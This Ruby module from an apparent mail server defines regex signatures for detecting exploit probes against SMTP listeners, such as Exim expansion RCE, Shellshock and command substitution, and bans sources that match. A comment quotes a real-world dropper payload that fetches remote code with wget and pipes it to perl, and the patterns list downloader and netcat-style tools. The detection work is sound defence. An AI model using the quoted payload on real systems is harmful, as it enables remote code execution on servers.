# frozen_string_literal: true

module MailOnRails
  module Netserv
    # Signatures for exploit-probe payloads thrown at the mail listeners: the
    # command-injection strings a scanner sends hoping the server is a known
    # vulnerable MTA. Matching one records a HoneypotEvent and bans the source.
    #
    # These are pure regexes checked against a command line and NOTHING is ever
    # evaluated, shelled, or expanded - the whole point is to recognise the
    # attempt and refuse it, so "record without executing" is inherent: the
    # server never passed these strings to a shell in the first place.
    #
    # Matching is confined to command lines (not DATA/APPEND payloads), so a
    # mail body full of ${...} shell noise cannot false-positive. Signatures
    # are named so the operator can see which fired and tune or allowlist;
    # VRFY/EXPN are lower-confidence than the injection tokens - still recorded,
    # but the name lets an operator distinguish reconnaissance from an exploit.
    module ProbeSignatures
      SIGNATURES = {
        # Exim string-expansion RCE (CVE-2019-10149 and relatives): ${run{...}}
        # and friends in a MAIL FROM / RCPT TO / EHLO argument.
        "exim_run" => /\$\{run\{/i,
        "exim_expansion" => /\$\{(?:sh|perl|readsocket|extract|lookup|dlfunc)\b/i,
        # Shellshock (CVE-2014-6271): a function-definition preamble.
        "shellshock" => /\(\s*\)\s*\{/,
        # Backtick / $() command substitution: either reaching for a system
        # path, or opening straight onto a downloader/interpreter (the
        # dropper shape seen in the wild - `RCPT TO:<"... $(nohup wget -qO -
        # http://x/y | perl &) ..."@cve.invalid>` - carries no path at all).
        # The interpreter form requires the program name right after the
        # opener (optional nohup/env/sudo/exec prefixes) so a backtick that
        # is merely an atext character in a real local-part can't trip it.
        "command_substitution" => %r{
          (?:`|\$\()
          (?:
            [^`)]*/(?:bin|etc|tmp|dev)/
            |
            \s*(?:(?:nohup|env|sudo|exec)\s+)*
            (?:wget|curl|fetch|tftp|perl|python[23]?|ruby|php|bash|sh|zsh|nc|ncat|netcat|busybox)\b
          )
        }xi,
        # SMTP address-enumeration reconnaissance against privileged locals.
        "vrfy_privileged" => /\AVRFY\s+(?:root|admin|administrator|postmaster|bin|daemon|mail)\b/i,
        "expn_probe" => /\AEXPN\b/i
      }.freeze

      # The name of the first signature +text+ matches, or nil.
      def self.match(text)
        SIGNATURES.find { |_name, regex| text.match?(regex) }&.first
      end
    end
  end
end
